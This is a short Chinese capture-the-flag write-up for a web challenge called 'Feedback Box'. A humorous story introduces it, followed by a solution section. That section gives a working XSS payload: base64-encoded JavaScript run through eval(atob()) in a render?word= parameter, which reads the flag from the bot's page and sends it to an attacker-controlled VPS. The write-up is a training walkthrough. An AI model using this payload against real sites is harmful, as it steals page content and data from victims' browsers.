# Feedback Box

**Author:** gbljdgb(Xp0int)

**Difficulty:** Normal

**Category:** Web

## 题目描述

小 T 一走进 CTF 赛场，所有的选手便都看着他笑，有的叫道，“小 T ，你又来发 XSS 了！”他不回答，对旁边的队友说，“我要在这个输入框里输入 `<script>alert('XSS攻击成功！')</script>`，然后提交表单。”他们又故意地高声嚷道，“你一定又在做违规操作了！”小 T 睁大眼睛说，“你怎么这样凭空指责人呢？”

“什么违规操作？我昨天亲眼见你利用 XSS 漏洞攻击了某个网站，被管理员警告了。”小 T 便涨红了脸，额上的青筋条条绽出，争辩道，“XSS 攻击不能算违规操作，XSS 攻击！黑客的事，能算违规操作么？”

## 题目解析

**暴露端口：`80`**

XSS 获取 bot 页面上的 flag

payload 如下:

以下 js 进行 base64 编码

```javascript
var flag = document.getElementsByTagName("li")[0].innerHTML;
location.href = "http://vps:port/?" + flag;
```

`http://ip:port/render?word=<script>eval(atob('{base64-payload}'));</script>`

然后在自己的 vps 机器上监听端口，获取 flag

![](https://s1.ax1x.com/2023/03/22/ppay1hD.png)
